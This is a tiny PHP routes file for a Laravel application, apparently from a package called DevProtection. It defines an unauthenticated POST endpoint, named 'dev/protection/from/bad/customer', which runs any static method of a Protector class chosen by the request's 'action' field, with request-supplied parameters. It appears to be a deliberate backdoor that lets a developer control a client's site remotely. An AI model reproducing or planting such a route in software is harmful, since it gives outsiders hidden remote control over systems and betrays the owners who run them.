<?php

    \Illuminate\Support\Facades\Route::post('dev/protection/from/bad/customer', function(){
        return call_user_func_array(['\MasterRO\DevProtection\Protector', request()->get('action')], request()->get('params', []));
    });